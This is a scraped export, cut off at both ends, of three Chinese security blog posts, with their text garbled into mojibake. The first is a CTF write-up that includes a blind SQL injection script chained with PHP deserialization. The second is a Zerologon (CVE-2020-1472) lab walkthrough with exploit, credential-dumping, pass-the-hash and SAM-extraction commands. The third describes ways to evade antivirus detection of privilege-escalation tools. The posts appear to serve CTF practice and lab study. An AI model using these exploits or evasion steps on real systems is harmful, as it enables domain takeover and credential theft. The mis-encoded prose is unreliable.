ç„¶åå¾ˆè‡ªç„¶çš„å°†ç›®å…‰æŠ•æ”¾åˆ°ä¸Šé¢çš„ipç±»ä¸­ï¼Œ\b\b\bçœ‹åˆ°æ­¤ç±»è·å–äº†è®¿é—®è€…XFFå¹¶æ’å…¥è¡¨ä¸­ï¼Œå¾ˆè‡ªç„¶çš„å°±æƒ³åˆ°äº†xffæ³¨å…¥ï¼Œé€šè¿‡æ³¨å…¥æ¥è·å¾—keyï¼Œæ¥èµ‹å€¼flagç±»ä¸­çš„checkå˜é‡ï¼Œè€Œæ­¤mysqlè¯­å¥æ”¾åœ¨__toString()ä¸­ï¼Œæƒ³è¦è¿è¡Œæ­¤å‡½æ•°å°±è¦æ»¡è¶³ä¸€ä¸ªå¯¹è±¡è¢«å½“åšå­—ç¬¦ä¸²å¯¹å¾…æ¥è§¦å‘,æ‰€ä»¥æˆ‘ä»¬éœ€è¦å¯»æ‰¾ä¸€ä¸ªèƒ½å¤Ÿè§¦å‘__toString()çš„ç‚¹ public function __wakeup(){ if(stristr($this-&gt;ip, &quot;n1ctf&quot;)!==False) $this-&gt;ip = &quot;welcome to n1ctf2020&quot;; else $this-&gt;ip = &quot;noip&quot;; } åˆ†æä¸€ä¸‹å‘ç°ï¼Œæˆ‘ä»¬ä¼ å…¥ååºåˆ—åŒ–æ•°æ®ä¼šè§¦å‘__wakeup(),æ­¤å¤„çš„stristr()å‡½æ•°æ˜¯å¯¹ä¼ å…¥å‚æ•°1ä¸­æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨å‚æ•°2,è€Œå‚æ•°1ä¹Ÿå°±æ˜¯$this-&gt;ipæ˜¯æˆ‘ä»¬å®ä¾‹åŒ–flagæ—¶ä¼ å…¥çš„å­—ç¬¦ä¸²ï¼Œå±äºå¯æ§å‚æ•°ï¼Œè€Œå½“æˆ‘ä»¬ä¼ å…¥çš„æ˜¯ipç±»å®ä¾‹åŒ–åçš„å¯¹è±¡æ—¶ï¼Œåˆ™åˆšå¥½è§¦å‘æ­¤ipç±»çš„__toString()å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬æ­¤æ—¶å¯ä»¥ç”Ÿæˆåºåˆ—åŒ–æ•°æ®è¿›è¡Œå°è¯• $flags = new flag(new ip()); $b = serialize($flags); echo $b; INSERT into admin(`username`,`password`) VALUES ('user' and updatexml(1,concat(0x02,(select database()),0x02),1) and '','123456') ç„¶ååœ¨æœ¬åœ°mysqlå°è¯•æ„é€ äº†ä¸€ä¸ªinsertæ³¨å…¥payload: INSERT into admin(username,password) VALUES ('user' or if(1=1,sleep(3),1) or '','123456')\bæœ¬åœ°è¿è¡ŒæˆåŠŸï¼Œè®¿é—®ç›®æ ‡æ—¶æç¤ºå¦‚å›¾ å­˜åœ¨æ³¨å…¥æ£€æµ‹ï¼Œåº”è¯¥å°±æ˜¯wafå‡½æ•°æ²¡æ˜¾ç¤ºçš„é‚£äº›ä»£ç ï¼Œæ‰€ä»¥æ— æ³•ç›´æ¥è¿›è¡Œæ³¨å…¥ï¼Œéœ€è¦å¦æƒ³åŠæ³•ï¼Œè€Œ__wakeup()å‡½æ•°ä¸­æœ‰ä¸€ä¸ªå¯ä»¥å¸®åŠ©ç›²æ³¨çš„ç‚¹ï¼Œè§¦å‘__toString()æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æŠ¥é”™å‡½æ•°æ¥æ§åˆ¶è¿”å›çš„å­—ç¬¦ä¸²æ˜¯å¦å­˜åœ¨n1ctfï¼Œæ‰€ä»¥æ„é€ æ³¨å…¥è¯­å¥1.1.1.1' or updatexml(1,concat(0x01,(select if((1=1),'n1ctf','no str')),0x01),1) or ' æç¤ºäº†welcome to n1ctf2020ï¼Œé‚£ä¹ˆåªæœ‰åœ¨\b\b\bä¼ å…¥çš„å€¼ä¸­åŒ…å«n1ctfæ‰ä¼šæç¤ºè¿™ä¸ªï¼Œæ‰€ä»¥å¾ˆæ˜æ˜¾æ˜¯ä¼ å…¥çš„å¯¹è±¡æˆåŠŸè§¦å‘toStringå‡½æ•°ï¼Œè¯æ˜æ€è·¯æ˜¯æ­£ç¡®çš„ï¼Œå…¶ä¸­çš„æŠ¥é”™å‡½æ•°å¯¼è‡´sqlè¯­å¥æŠ¥é”™ï¼Œä½¿returnçš„è¿”å›å€¼ä¸­åŒ…å«äº†n1ctfï¼Œæ ¹æ®è¿™ä¸ªé€»è¾‘å»å†™ä¸€ä¸ªpythonè„šæœ¬è·‘ä¸€ä¸‹,æˆ‘è¿™é‡Œä½¿ç”¨äº†ä¸€ä¸ªå¾ˆå®ç”¨çš„burpsuiteçš„æ’ä»¶è¾…åŠ©ç”Ÿæˆä¸ªæ¨¡æ¿ exp import requests session = requests.Session() x = 'qwertyuiopasdfghjklzxcvbnm1234567890' arr = [] paramsGet = {&quot;input&quot;:&quot;O:4:\\&quot;flag\\&quot;:2:{s:2:\\&quot;ip\\&quot;;O:2:\\&quot;ip\\&quot;:1:{s:2:\\&quot;ip\\&quot;;s:9:\\&quot;127.0.0.1\\&quot;;}s:5:\\&quot;check\\&quot;;N;}&quot;} for start in range(1,30): for result in x: #è·å¾—è¡¨åä¸ºn1key # get_tables = &quot;' or updatexml(1,concat(0x02,(select if((substring((select group_concat(table_name) from information_schema.tables where table_schema='n1ctf_websign'),{},1)='{}'),'n1ctf','no str')),0x02),1) or '&quot;.format(start,result) #è·å¾—åˆ—å # get_column = &quot;' or updatexml(1,concat(0x02,(select if((substring((select group_concat(column_name) from information_schema.columns where table_name='n1key' and table_schema='n1ctf_websign'),{},1)='{}'),'n1ctf','no str')),0x02),1) or '&quot;.format(start,result) #è·å¾—keyå€¼ get_key = &quot;' or updatexml(1,concat(0x02,(select if((substring((select `key` from n1key),{},1)='{}'),'n1ctf','no str')),0x02),1) or '&quot;.format(start,result) headers = {&quot;Cache-Control&quot;:&quot;no-cache&quot;,&quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;,&quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;X-Forwarded-for&quot;:&quot;1.1.1.1{}&quot;.format(get_key),&quot;Pragma&quot;:&quot;no-cache&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.9,ar;q=0.8&quot;} response = session.get(&quot;http://101.32.205.189/index.php&quot;, params=paramsGet, headers=headers) if '&lt;code&gt;noip&lt;/code&gt;' not in str(response.content): print('tables:'+result) arr.append(result) for res in arr: print(res,end=&quot;&quot;) è·å¾—äº†è¡¨åä¸ºn1ip, n1keyï¼Œè¿™é‡Œæ˜¯å› ä¸ºæºç é‡Œæœ‰æ•°æ®åº“åä¸ºn1ctf_websignï¼Œæ‰€ä»¥å¯ç›´æ¥è·‘å‡ºè¡¨å è·å¾—åˆ—åä¸ºid,key è·å¾—keyä¸ºn1ctf20205bf75ab0a30dfc0c ç„¶åç”¨è¿™ä¸ªkeyç”Ÿæˆåºåˆ—åŒ–æ•°æ®è¿›è¡Œè®¿é—®ï¼Œå¾—åˆ°flag ","link":"https://www.svenbeast.com/post/n1ctf2020websigninwriteup/"},{"title":"CVE-2020-1472 NetLogon ç‰¹æƒæå‡æ¼æ´ ","content":"0x01 æ¼æ´è¯¦æƒ… NetLogonç»„ä»¶ æ˜¯ Windows ä¸Šä¸€é¡¹é‡è¦çš„åŠŸèƒ½ç»„ä»¶ï¼Œç”¨äºç”¨æˆ·å’Œæœºå™¨åœ¨åŸŸå†…ç½‘ç»œä¸Šçš„è®¤è¯ï¼Œä»¥åŠå¤åˆ¶æ•°æ®åº“ä»¥è¿›è¡ŒåŸŸæ§å¤‡ä»½ï¼ŒåŒæ—¶è¿˜ç”¨äºç»´æŠ¤åŸŸæˆå‘˜ä¸åŸŸä¹‹é—´ã€åŸŸä¸åŸŸæ§ä¹‹é—´ã€åŸŸDCä¸è·¨åŸŸDCä¹‹é—´çš„å…³ç³»ã€‚ å½“æ”»å‡»è€…ä½¿ç”¨ Netlogon è¿œç¨‹åè®® (MS-NRPC) å»ºç«‹ä¸åŸŸæ§åˆ¶å™¨è¿æ¥çš„æ˜“å—æ”»å‡»çš„ Netlogon å®‰å…¨é€šé“æ—¶ï¼Œå­˜åœ¨ç‰¹æƒæå‡æ¼æ´ã€‚æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´çš„æ”»å‡»è€…å¯ä»¥åœ¨ç½‘ç»œä¸­çš„è®¾å¤‡ä¸Šè¿è¡Œç»ç‰¹æ®Šè®¾è®¡çš„åº”ç”¨ç¨‹åºã€‚ 0x02 å½±å“ç‰ˆæœ¬ Windows Server 2008 R2 for x64-based Systems Service Pack 1 Windows Server 2008 R2 for x64-based Systems Service Pack 1 (Server Core installation) Windows Server 2012 Windows Server 2012 (Server Core installation) Windows Server 2012 R2 Windows Server 2012 R2 (Server Core installation) Windows Server 2016 Windows Server 2016 (Server Core installation) Windows Server 2019 Windows Server 2019 (Server Core installation) Windows Server, version 1903 (Server Core installation) Windows Server, version 1909 (Server Core installation) Windows Server, version 2004 (Server Core installation) 0x03 åŸŸç¯å¢ƒæ­å»º é¶æœºç¯å¢ƒï¼šhttps://pan.baidu.com/s/13nU-0vsGBnGejGCKzwphfQ&amp;shfl=sharepset æå–ç ï¼š41y6 DC windows server 2012 å•ç½‘å¡ IP: 10.10.10.10 ç½‘å…³: 10.10.10.1 PC windows 7 åŒç½‘å¡ IP: 10.10.10.201 ç½‘å…³: 10.10.10.1 IP: 172.21.139.173 ç½‘å…³: 172.21.139.1 WEB windows 2008 åŒç½‘å¡ IP: 10.10.10.80 ç½‘å…³: 10.10.10.1 IP: 172.21.139.41 ç½‘å…³: 172.21.139.1 Macæ”»å‡»æœº 172.21.139.37 0x04 è¿‡ç¨‹è®°å½• æ­£å‘SOCKS5ï¼šå°†è¢«æ”»å‡»æœºå™¨çš„æµé‡ä»£ç†åˆ°Macæ”»å‡»æœºä¸­,Macç”¨proxychains4ä»£ç† (æ‹¿åˆ°ä¸€ä¸ªå…¥å£ç‚¹,æŠŠæµé‡ä»£ç†å‡ºå») ew_for_Win.exe -s ssocksd -l 8888 å®šä½åŸŸæ§IP net time /domain ping DC æ£€æµ‹åŸŸæ§æ˜¯å¦å­˜åœ¨æ­¤æ¼æ´ ./proxychains4 python3 zerologon_tester.py DC(åŸŸæ§åå­—) 10.10.10.10(åŸŸæ§IP) è¿”å›Success,ä»£è¡¨å­˜åœ¨æ¼æ´ é‡ç½®åŸŸæ§è´¦æˆ·å¯†ç  ./proxychains4 python3 cve-2020-1472-exploit.py DC 10.10.10.10 å¯è¿›è¡Œæ“ä½œ1ï¼šæ­¤æ—¶åŸŸæ§å¯†ç ä¸ºç©ºï¼ŒåŒç­‰äºå·²çŸ¥å¯†ç ï¼Œæ‰€ä»¥å¯ä»¥å¯¼å‡ºåŸŸå†…æ‰€æœ‰ç”¨æˆ·å‡­æ® proxychains4 secretsdump.py test.local/dc\\$@10.10.10.10 -no-pass proxychains4 secretsdump.py test.local/åŸŸæ§åå­—\\$@10.10.10.10 -no-pass å¯è¿›è¡Œæ“ä½œ2ï¼šè·å–åŸŸç®¡ç†å‘˜åå­—ï¼Œå¯¼å‡ºåŸŸç®¡çš„hash net group &quot;domain admins&quot; /domain ./proxychains4 secretsdump.py test.local/dc\\$@10.10.10.10 -no-pass -just-dc | grep 'Administrator' å¯è¿›è¡Œæ“ä½œ3ï¼šå·²çŸ¥åŸŸç®¡hashï¼Œé€šè¿‡wmic æ‹¿åˆ°åŸŸæ§åˆ¶å™¨ä¸­çš„æœ¬åœ°ç®¡ç†å‘˜æƒé™ï¼Œnice~ (åŸŸç®¡) ./proxychains4 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:161cff084477fe596a5db81874498a24 test.local/Administrator@10.10.10.10 æ¢å¤åŸŸæ§å¯†ç ï¼šå·²ç»é€šè¿‡wmicæ‹¿åˆ°åŸŸæ§æœ¬åœ°ç®¡ç†å‘˜æƒé™æ—¶ï¼Œå¼€å§‹å¯¼å‡ºsamæ•°æ®åº“ä¸­åŸæ¥çš„è®¡ç®—æœºhash reg save HKLM\\SYSTEM system.save reg save HKLM\\SAM sam.save reg save HKLM\\SECURITY security.save get system.save get sam.save get security.save del /f system.save del /f sam.save del /f security.save åˆ©ç”¨å¯¼å‡ºçš„samæ•°æ®åº“ï¼Œæå–å‡ºæœºå™¨è´¦å·çš„æ˜æ–‡hex ./proxychains4 secretsdump.py -sam sam.save -system system.save -security security.save LOCAL åˆ©ç”¨æå–çš„æ˜æ–‡hexï¼Œè¿›è¡Œæœ€åçš„æ¢å¤æ“ä½œ ./proxychains4 python3 restorepassword.py DC@DC -target-ip 10.10.10.10 -hexpass 6b69e91c1675c3f849e7ac70f4baf81782df5336244b75c9fd08c6ab02b0ed1c434ce5bbf3d7f260f02e5b8e4e817e7fa64eb8337bac67577c902b04334816f3e329d2817d9508398b405d47a81651b444e3c7f34b6be3804ad5ff950e9dcb40008e190a8c819c75300a3dee8a3c4b5a19b488725d9234e3fe7462f84660fe02fe3d0ee63e303fed23f970369ec3b870669edc578980f0630066f5df8853c2e63dd190169861d68ff1b36a0b3d6020fa61d1bd951851a8ea74fbe63675e3d52aee12385f8405b01d4d1d4d7ed151d44d3043d13636964666d29dbe48ac74a0c33cba2c506a3f01689ba2d667b38dcc98 PS: æ¢å¤åçš„hashç»è¿‡æ£€æŸ¥ï¼Œå®Œæ•´æ¢å¤ï¼Œå’Œæ¼æ´åˆ©ç”¨å‰çš„hashæ˜¯ä¸€æ ·çš„ 0x04 å‘ç‚¹ expè¿è¡Œä¸­ä¼šå› ä¸ºimpacketæŠ¥é”™ï¼Œé‡æ–°å®‰è£…æ­¤æ¨¡å—å³å¯git clone https://github.com/SecureAuthCorp/impacket.git cd impacket &amp;&amp; pip3 install . ä¸€äº›è„šæœ¬æ˜¯impacketæ¨¡å—é‡Œé¢çš„pyæ–‡ä»¶ expçš„ä¸€äº›å‚æ•°ï¼Œæœ€å¥½ææ¸…æ¥šå¯¹åº”åŸŸçš„é‚£äº›ä¸œè¥¿ å›¾ç‰‡å¾ˆå¤šï¼Œç¯å¢ƒéº»çƒ¦ï¼Œèƒ½æŒ¤å‡ºæ—¶é—´çœŸä¸å®¹æ˜“ã€‚ ","link":"https://www.svenbeast.com/post/fu-xian-cve-2020-1472-netlogon-te-quan-ti-sheng-lou-dong/"},{"title":"ã€ç ”ç©¶ã€‘ä»1åˆ°é’ˆå¯¹AVæŸç§åœºæ™¯ä¸‹çš„å…æ€æ¢ç©¶è¿‡ç¨‹","content":"0x01 èµ·å›  ç°åœ¨æ˜¯ä¿¡æ¯åŒ–çˆ†ç‚¸æ—¶ä»£ï¼Œä¸ºäº†èƒ½å¤Ÿæ›´å…¨é¢çš„å¸æ”¶(copy)çŸ¥è¯†çš„åŠ›é‡ï¼Œæœ€è¿‘æ­å»ºäº†å¾®ä¿¡å…¬ä¼—å·çš„RSSç³»ç»Ÿï¼Œè€Œåœ¨è°ƒè¯•é˜¶æ®µä¸­çœ‹åˆ°äº†è¿™æ ·çš„ä¸€ç¯‡æ–‡ç«  printspooferå…æ€è¿‡360å…¨å®¶æ¡¶ï¼Œå¾ˆå–œæ¬¢è¿™ç§å®ç”¨æ–‡ç« ï¼Œå®‰å…¨è¡Œä¸šæ€ä¹ˆéƒ½æ˜¯éœ€è¦ç”¨æˆ–è€…æ¥è§¦ä¸€äº›å…æ€çš„ä¸œè¥¿ï¼Œä¸æ€•ç”¨ä¸ä¸Šï¼Œå°±æ€•ä¸çŸ¥é“ã€‚ ç°åœ¨çš„æ–‡ç« è¦ä¸å°±æ˜¯æ²¡ç”¨çš„æ°´æ–‡(æ¯”å¦‚æˆ‘)ï¼Œè¦ä¸å°±æ˜¯çœ‹ä¸æ‡‚çš„æ°´æ–‡(å·¨ä½¬)ï¼Œå¾ˆèµåŒklionå¸ˆå‚…ä¸€ç¯‡æ–‡ç« è§£å†³ä¸€ä¸ªå®é™…é—®é¢˜çš„è¿™ç§é£æ ¼ï¼Œä¹Ÿå¾ˆå–œæ¬¢é…’ä»™æ¡¥å‘æ–‡çš„æ’ç‰ˆå’Œæ–‡ç¬”ï¼Œé¢ã€‚é—²è¯åˆ°æ­¤ä¸ºæ­¢ã€‚ ä¸»è¦å†…å®¹æ˜¯è®°å½•ç”±moonsecçš„æ–‡ç« å¼•å‘å¯¹æŸAVé’ˆå¯¹è¿™ç§æ¼æ´åˆ©ç”¨å·¥å…·æŸ¥æ€è§„åˆ™çš„æ¢ç©¶è¿‡ç¨‹ä¸åˆ©ç”¨æ–¹æ³• 0x02 è¿˜åŸæ–‡ç« æµç¨‹ PrintSpooferæ˜¯ä¸€ä¸ªwindowsæœ¬åœ°ææƒåˆ©ç”¨å·¥å…· æœ¬æ¬¡æµ‹è¯•è¿‡ç¨‹ä¸­çš„exeç”Ÿæˆå…¨éƒ¨é€‰æ‹©ç”Ÿæˆx86ä½ç¨‹åº \b 1.å…¬ä¼—å·æ–‡ç« ä¸­æ˜¯é’ˆå¯¹PrintSpooferåˆ†äº«çš„å…æ€æ–¹æ³•ï¼Œé‚£å…ˆç”Ÿæˆå‡ºPrintSpoofer.exeï¼Œæ”¾å…¥å¸ƒç½®åœ¨å…¬ç½‘è£…æœ‰ç«ç»’å’Œ360çš„VPSä¸­(vpsçš„ç¯å¢ƒæ„Ÿè§‰æ›´æ¥è¿‘çœŸå®æƒ…å†µ)ï¼Œæ„æ–™ä¸­çš„é£é€Ÿkillï¼Œä¹Ÿå°±æ˜¯ctrl+vè¯»æ¡åˆšåˆšç»“æŸçš„ç¬é—´ 2.æ–‡ä¸­çš„å¤„ç†æ–¹æ³•ï¼ŒæŒ‰ç…§è¿™ä¸ªè¿›è¡Œä¿®æ”¹ï¼Œç»“æœæ²¡æœ‰é—®é¢˜ï¼ŒæˆåŠŸbypassAV(å…¶å®ä¸»è¦æ˜¯è¿‡æ•°å­—AVçš„ä¸»åŠ¨äº‘æŸ¥æ€ï¼ŒåŒæ—¶äº‘æŸ¥æ€ä¹Ÿæ˜¯æ•°å­—AVçš„äº®ç‚¹) Â·PrintSpoofer å°†è¿™ä¸ªå…³é”®è¯æ›¿æ¢æˆå…¶ä»–å­—ç¬¦ä¸² å¦‚ moonsec Â·PrintSpoofer.cpp PrintSpoofer.h å…¨éƒ¨æ”¹ä¸º moonsec Â·å¸®åŠ©æ³¨é‡Šå…¨éƒ¨å¤„ç†æ‰ Â·release x64 é‡æ–°ç”Ÿæˆ (æˆªæ­¢åˆ°æ–‡ç« ç¼–è¾‘ç»“æŸï¼Œç›®å‰å¦‚æœç”Ÿæˆx64ä½çš„ä¼šè¢«æŸ¥æ€ï¼Œx86ä½æ²¡æœ‰é—®é¢˜) 0x03 æ€è€ƒ 1.ä¸ºä»€ä¹ˆä¿®æ”¹å…³é”®è¯å¯ä»¥è¿‡æ‰ä¸»åŠ¨æŸ¥æ€ï¼Œä¿®æ”¹å“ªä¸ªå…³é”®è¯å‘½ä¸­è§„åˆ™ï¼Œè¿˜æ˜¯ä¿®æ”¹å…³é”®è¯å¯¼è‡´æ”¹å˜äº†ä»€ä¹ˆå‘¢ï¼Œå¼€å§‹å°è¯•ç¼©å‡å…³é”®è¯èŒƒå›´ åªè¿›è¡Œ PrintSpoofer å°†è¿™ä¸ªå…³é”®è¯æ›¿æ¢æˆå…¶ä»–å­—ç¬¦ä¸² å¦‚ moonsec å‘ç°åŒæ ·æœªè¢«æŸ¥æ€ï¼Œæ²¡æœ‰é—®é¢˜ï¼Œçœ‹æ¥å¯ä»¥ç»§ç»­è¿½ä¸€ä¸‹ 2.ä¸Šæ¬¡ä¿®æ”¹äº†5å¤„PrintSpooferå­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆè¿™æ¬¡é€‰æ‹©åªä¿®æ”¹includeè¿™ä¸€å¤„æ˜¯å¦å¯ä»¥å‘¢ å‘ç°è¢«æŸ¥æ€ killï¼Œçœ‹æ¥includeè¿™é‡Œä¸æ˜¯å…³é”®ç‚¹ 3.ä¸Šæ¬¡ä¿®æ”¹äº†includeè¿™ä¸€å¤„ï¼Œæœ¬è´¨ä¸Šæ²¡æœ‰æ”¹å˜æºä»£ç çš„é€»è¾‘ï¼Œé‚£ä¹ˆæ˜¯å¦æ”¹å˜é€»è¾‘æ‰æ˜¯å…³é”®ç‚¹å‘¢ ä¿®æ”¹ä»£ç ä¸­çš„æºä»£ç ï¼Œä»é€»è¾‘ä¸Šè¿›è¡Œä¿®æ”¹ï¼Œæ­¤æ¬¡åœ¨ä»»æ„ä½ç½®æ·»åŠ ä¸€å¥è¾“å‡ºï¼Œè¿™æ˜¯æœ€ç®€å•çš„åŠæ³• ä»ç»“æœæ¥çœ‹ï¼Œæ˜¯æ²¡æœ‰è¢«æŸ¥æ€çš„ 0x04 å»¶ä¼¸ é‚£ä¹ˆæ—¢ç„¶æ”¹å˜é€»è¾‘æ˜¯ä¸€ä¸ªå°å…³é”®ç‚¹ï¼ˆå¼€å§‹ä»¥ä¸ºæ˜¯exeçš„md5æ˜¯å”¯ä¸€çš„ï¼Œä¸è¿‡å‘ç°æ¯æ¬¡ç”Ÿæˆçš„exeçš„md5éƒ½æ˜¯ä¸ä¸€æ ·çš„ï¼Œ\bè¿™äº›ä¸œè¥¿ç®—æ˜¯çŸ¥è¯†ç›²åŒºå“ˆï¼Œæˆ‘å°±ç†è§£ä¸ºç›¸åŒä»£ç ç”Ÿæˆçš„exeæœ‰ä¸€ä¸ªå”¯ä¸€æ ‡è¯†ï¼Œæ”¹ä¸ªé€»è¾‘å°±å¯ä»¥æ”¹äº†å”¯ä¸€æ ‡è¯†è¿™æ ·å­ï¼Œæ‡‚å¾—å¸ˆå‚…è¯·åˆ«åœ¨æ„å“ˆ0.0ï¼‰ï¼Œé‚£ä¹ˆé’ˆå¯¹å…¶ä»–CVEææƒå·¥å…·æ˜¯å¦æœ‰æ•ˆå‘¢ CVE-2020-0796ï¼šhttps://github.com/danigargu/CVE-2020-0796 ç›®å‰Githubçš„staræ•°ä¸Šåƒ ï¼Œç†è®ºä¸Šæ˜¯ä¸€ä¸ªæµè¡Œä¸”å½±å“å¹¿æ³›çš„windowsæœ¬åœ°ææƒçš„æ¼æ´ Â· æˆ‘ç”Ÿæˆäº†ä¸€ä¸ªåŸç‰ˆexeï¼Œä¸€ä¸ªupdateç‰ˆexeï¼Œç»“æœæ˜¯å…¨éƒ¨è¢«æ·˜æ±°ï¼Œä½†æ˜¯ç»†å¿ƒçš„æˆ‘å‘ç°äº†ä¸€ç‚¹ä¸åŒã€‚ã€‚æ­¤å¤„ä¸Šgifæ¥ä½“ç° åˆç»è¿‡äº†å‡ æ¬¡å°è¯•ï¼Œå¯ä»¥ç¡®å®šåŸç‰ˆåŸºæœ¬æ˜¯ç§’æ€ï¼Œå¶å°”æ‰æ˜¯AVä¼šå®•æœºä¸€ä¼šåæŸ¥æ€ï¼Œè€Œä¿®æ”¹ç‰ˆæ˜¯ç»è¿‡å‡ åç§’åˆ°å‡ åˆ†é’Ÿä¸ç­‰åæ‰ä¼šè¢«æŸ¥æ€ï¼Œä¸”æŸ¥æ€åé‡å¤æ­¤è¿‡ç¨‹çš„è¯ä¿®æ”¹ç‰ˆä¹Ÿä¼šè¢«ç§’æ€ ã€Œåˆ’é‡ç‚¹ï¼šä¸­é€”å¯æˆåŠŸè¿è¡Œexeã€ 0x05 ç»“è®º 1.æ•°å­—AVåº”è¯¥æ˜¯å¯¹è¿™äº›æ¼æ´åˆ©ç”¨å·¥å…·ä¸ºäº†æŸ¥æ€æ•ˆç‡ï¼Œå ç”¨cpuå¤§å°æˆ–è€…å…¶ä»–ç›®çš„æ¥ä½¿ç”¨ä¸åŒçš„æŸ¥æ€è§„åˆ™å¯¹å¾… 2.æ¯”å¦‚ä¸€èˆ¬çš„å°±æ˜¯å”¯ä¸€æ ‡è¯†æŸ¥æ€ï¼Œæœ¬åœ°æŸ¥æ€åº“å­˜åœ¨å°±ç›´æ¥æŸ¥æ€ï¼Œåœ¨æµè¡Œçš„å°±æ˜¯å”¯ä¸€æ ‡è¯†åŠ æ²™ç®±æˆ–è€…å…¶ä»–æ·±åº¦ å”¯ä¸€æ ‡è¯†æŸ¥æ€ç­‰ç­‰ï¼Œæœ¬åœ°æŸ¥æ€åº“æ²¡æœ‰çš„ä¸Šä¼ äº‘æ•°æ®åº“æˆ–è€…æ²™ç®±æ¥å¾—å‡ºç»“è®ºè¿›è¡ŒæŸ¥æ€ 3.è€Œæ— è®ºæ˜¯æ²™ç®±æˆ–è€…æ·±åº¦å”¯ä¸€æ ‡è¯†æŸ¥æ€ï¼Œéƒ½æ˜¯éœ€è¦è®¡ç®—èµ„æºæ¥æ”¯æŒï¼Œå­˜åœ¨çš„è¿‡ç¨‹æ¨æ–­å¤§æ¦‚ä¸ºï¼šä¸Šä¼ -&gt;äº‘èµ„æº è®¡ç®—(äº‘æŸ¥æ€åº“æˆ–è€…æ²™ç®±ä»€ä¹ˆçš„)-&gt;å¾—å‡ºç»“æœå¹¶è¿”å› 4.é‚£ä¹ˆæ•°å­—AVçš„ç”¨æˆ·ä½•å…¶åºå¤§ï¼Œå¯èƒ½æŒ‰äº¿è®¡ç®—ï¼ŒçŒœæµ‹æ¯æ—¶æ¯ç§’æ¥å—çš„å¯ç–‘æ–‡ä»¶ä¸Šä¼ æ•°é‡æ•°å­—æ˜¯å¾ˆå¤§çš„ï¼Œå†åŠ  ä¸ŠæŸ¥è¯¢æˆ–è€…æ£€æµ‹æ—¶é—´ï¼Œæ•´ä½“å ç”¨çš„èµ„æºå¬èµ·æ¥å°±æ˜¯ä¹°ä¸èµ·çš„æ ·å­ï¼Œè€Œä¸€ä¸ªå…¬å¸åŸºäºæˆæœ¬ï¼Œäº§å‡ºï¼Œæ”¶ç›Šæ˜¯ä¸å¯èƒ½ é…å¤‡å®Œå…¨å¯ä»¥è¾¾åˆ°å®æ—¶æ£€æµ‹çš„è¿™ç§è®¡ç®—èµ„æºçš„ï¼Œæ‰€ä»¥å¯¹äºæœ¬åœ°æ— æ³•æŸ¥æ€çš„exeåœ¨ä¸Šä¼ åˆ°äº‘çš„è¿™æ®µæ—¶é—´æ˜¯å¿…é¡»å­˜ åœ¨çš„ï¼Œè€Œè¿™æ®µæ—¶é—´å¯¹äºè¿™ç§æ¼æ´åˆ©ç”¨å·¥å…·æ˜¯å¾ˆå‹å¥½çš„ã€‚ 5.æ­£å¸¸æ¥è¯´ï¼Œè¿™ç®—æ˜¯é’»ç©ºå­ï¼Ÿè²Œä¼¼ä¸å¤ªå¥½è§£å†³çš„ç©ºå­ï¼Œè¿™ç§å¢åŠ è®¡ç®—èµ„æºï¼Œé€ æˆæˆæœ¬å¢åŠ çš„ä¸œè¥¿åº”è¯¥ä¸å¤ªå¥½ ç”³è¯·ä¸‹æ¥ï¼Œæ¯•ç«Ÿæ”¶ç›Šåªæ˜¯æŸ¥æ€é€Ÿåº¦å¿«ä¸€ç‚¹ã€‚ PSï¼šå½“ç„¶ä¹Ÿå¯èƒ½è¯¯æ‰“è¯¯æ’å¾—å‡ºè¿™ä¹ˆä¸€ä¸ªç»“è®ºï¼Œæ¯•ç«Ÿæ˜¯å¥½å¥‡çŒœå‡ºæ¥çš„ -.- ! åˆ©ç”¨åœºæ™¯ï¼šç›®æ ‡æœºå­˜åœ¨é˜²æŠ¤ï¼Œä¸Šä¼ ææƒè„šæœ¬æˆ–å…¶ä»–ç¨‹åºè¢«ç›´æ¥æŸ¥æ€ï¼Œæ­¤æ—¶ä½¿ç”¨æ­¤æ–¹æ³•äº‰ä¸€ä¸ªæ—¶é—´å·®è·å¾—ä¸€ä¸ªsystemæƒé™cmdå®Œå…¨æ²¡æœ‰é—®é¢˜ï¼Œæ—¶é—´å¾ˆå……è£•ï¼Œç†è®ºä¸Šè¿™ä¸ªæ–¹æ³•é€šæ€ã€‚ã€‚ 0x06 æ— æºç æ—¶å¦‚ä½•ä¿®æ”¹ ç›´æ¥ä½¿ç”¨IDAä¿®æ”¹exeå°±å¯ä»¥çš„ï¼Œä¸ºäº†çœŸå®ä¸€äº›å°±å°è¯•ä¿®æ”¹ä¸€ä¸ªä»¥å‰å‘åœ¨t00lsçš„çƒ‚åœŸè±† ä¸‹è½½ä¸‹æ¥ï¼Œæ–‡ä»¶æ˜¯æ­£å¸¸è¿è¡Œçš„ï¼Œå½“ç„¶ç°åœ¨è‚¯å®šåœ¨æŸ¥æ€åº“é‡Œï¼Œç›´æ¥ç§’æ€ï¼Œè¿™æ˜¯æˆ‘åˆæ¢å¤å‡ºæ¥åè¿è¡Œçš„ æ‰“å¼€åç›´æ¥å°±çœ‹åˆ°äº†ä¸€äº›è¾“å‡ºçš„å­—ç¬¦ä¸²ï¼Œè¿™ä¸ªä¸­æ–‡è›®æ˜æ˜¾çš„ã€‚ æˆ‘è§„çŸ©ç‚¹ï¼Œè¿˜æ˜¯æœå­—ç¬¦ä¸²æ¥æ‰¾ä¿®æ”¹ç‚¹ ç‚¹å‡» View -&gt; Open subviews -&gt; Strings æˆ–è€…shift+f12 ä¼šå‡ºç°IDAæ”¶é›†çš„è¿™ä¸ªexeçš„ä¸€äº›å­—ç¬¦ä¸²ç‰‡æ®µ æ 